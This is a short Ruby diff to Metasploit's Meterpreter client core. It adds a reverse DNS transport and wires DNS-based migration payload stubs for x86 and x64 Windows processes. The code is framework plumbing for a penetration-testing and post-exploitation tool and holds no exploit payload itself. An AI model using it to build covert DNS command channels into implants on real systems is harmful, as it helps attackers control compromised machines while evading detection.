@@ -37,12 +37,14 @@ class ClientCore < Extension
   METERPRETER_TRANSPORT_TCP   = 0
   METERPRETER_TRANSPORT_HTTP  = 1
   METERPRETER_TRANSPORT_HTTPS = 2
+  METERPRETER_TRANSPORT_DNS   = 3
 
   VALID_TRANSPORTS = {
       'reverse_tcp'   => METERPRETER_TRANSPORT_TCP,
       'reverse_http'  => METERPRETER_TRANSPORT_HTTP,
       'reverse_https' => METERPRETER_TRANSPORT_HTTPS,
-      'bind_tcp'      => METERPRETER_TRANSPORT_TCP
+      'bind_tcp'      => METERPRETER_TRANSPORT_TCP,
+      'reverse_dns'   => METERPRETER_TRANSPORT_DNS
   }
 
   include Rex::Payloads::Meterpreter::UriChecksum
@@ -627,7 +629,6 @@ class ClientCore < Extension
 
     if target_process['arch'] == ARCH_X64
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
-
     else
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 1 ) # PROCESS_ARCH_X86
     end
@@ -780,9 +781,7 @@ private
 
     if client.platform == 'windows' && [ARCH_X86, ARCH_X64].include?(client.arch)
       t = get_current_transport
-
       c = Class.new(::Msf::Payload)
-
       if target_process['arch'] == ARCH_X86
         c.include(::Msf::Payload::Windows::BlockApi)
         case t[:url]
@@ -793,6 +792,9 @@ private
         when /^http/i
           # Covers HTTP and HTTPS
           c.include(::Msf::Payload::Windows::MigrateHttp)
+        when /^dns/i
+          # Covers reverse DNS
+          c.include(::Msf::Payload::Windows::MigrateDns)  
         end
       else
         c.include(::Msf::Payload::Windows::BlockApi_x64)
@@ -804,14 +806,15 @@ private
         when /^http/i
           # Covers HTTP and HTTPS
           c.include(::Msf::Payload::Windows::MigrateHttp_x64)
+        when /^dns/i
+          # Covers reverse DNS
+          c.include(::Msf::Payload::Windows::MigrateDns_x64)
         end
       end
-
       stub = c.new().generate
     else
       raise RuntimeError, "Unsupported session #{client.session_type}"
     end
-
     stub
   end
 
